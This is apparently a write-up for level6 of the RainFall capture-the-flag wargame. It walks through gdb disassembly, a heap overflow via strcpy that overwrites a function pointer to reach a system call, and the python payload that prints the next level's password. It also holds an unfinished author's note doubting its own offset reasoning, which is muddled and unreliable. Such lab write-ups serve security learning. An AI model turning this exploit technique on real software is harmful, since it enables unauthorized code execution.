level6@RainFall:~$ ls -l
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
level6@RainFall:~$ gdb ./level6
...
(gdb) info functions
...
0x08048454  n
0x08048468  m
0x0804847c  main
...

********************************************************************************
Three functions are defined, main, m, and n.
********************************************************************************

(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   %ebp
   0x08048455 <+1>:	mov    %esp,%ebp
   0x08048457 <+3>:	sub    $0x18,%esp
   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave
   0x08048467 <+19>:	ret
End of assembler dump.
(gdb) disas m
Dump of assembler code for function m:
   0x08048468 <+0>:	push   %ebp
   0x08048469 <+1>:	mov    %esp,%ebp
   0x0804846b <+3>:	sub    $0x18,%esp
   0x0804846e <+6>:	movl   $0x80485d1,(%esp)
   0x08048475 <+13>:	call   0x8048360 <puts@plt>
   0x0804847a <+18>:	leave
   0x0804847b <+19>:	ret
End of assembler dump.
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
   0x080484d2 <+86>:	leave
   0x080484d3 <+87>:	ret
End of assembler dump.

********************************************************************************
The main function allocates two buffers on the heap with malloc, of 64 bytes
and 4 bytes. The 4 bytes buffer is filled with the address of the m function,
and the 64 bytes buffer is used as the dest parameter for the call to strcpy.
We can also see that argv[1] is used a the src string for the call to strcpy.
Finally, the address stored into the 4 bytes buffer is moved to eax, and then
called before the function returns.
********************************************************************************

level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 bonjour
Nope

********************************************************************************
There is no check of the existence of argv[1], so when we launch the binary with
no parameters it segfault. Even if we provide a parameter though, the program
tells us we are wrong. We may understand the role of m and n functions better
if we could find some litteral data into the binary.
********************************************************************************

level6@RainFall:~$ cat level6
...
��������u��[]Ð�S��[��k�/����[�/bin/cat /home/user/level7/.passNope;@X���\|�����
...

********************************************************************************
We can easily understand that m is simply a call to puts that prints Nope,
and that n is a call to system, which would cat the flag for us if we could
execute this function instead of m. So now we need to write the address of n
into the 4 bytes buffer. Let's check the addresses of the buffers allocated by
malloc with gdb, to see if an eventual heap-buffer-overlfow attack could allow
us to write data into this buffer.
********************************************************************************

level6@RainFall:~$ gdb ./level6
(gdb) b *main+21
Breakpoint 1 at 0x8048491
(gdb) b *main+37
Breakpoint 2 at 0x80484a1
(gdb) run bonjour
Starting program: /home/user/level6/level6 bonjour

Breakpoint 1, 0x08048491 in main ()
(gdb) print $eax
$1 = 134520840
(gdb) step
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x080484a1 in main ()
(gdb) print $eax
$2 = 134520912

!!!Rewrite the part on argv1 offset \\ \\ because it seems that the offset is to get from
argv[0] on argv[1] and eax, (eax) is just to get what is inside argv1.

********************************************************************************
Good news, the second buffer (4 bytes) is located 4 bytes after the end of the
first one (64 bytes). So now we can give a parameter that will overflow the dest
(64 bytes) buffer in strcpy, to write the address of n into the second buffer.

There's one more thing to take in account though :
   0x080484b3 <+55>:	add    $0x4,%eax

\\
The address of argv[1] is added with 4. This has the effect to offset src string
of 4 bytes after argv[1]. Meaning that we will have to write four padding chars
into our command-line parameter before to actually "write" into the first buffer.
Let's create our payload.

argv[1] offset (4) + First buffer len (64) + malloc offset(4) == 72 padding bytes
\\

So now we just have to launch level6 with as parameter a string containing 72
random bytes, followed by the address of the n function.
********************************************************************************

level6@RainFall:~$ var=$(python -c "print('a' * 72 + '\x54\x84\x04\x08')")
level6@RainFall:~$ ./level6 $var
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
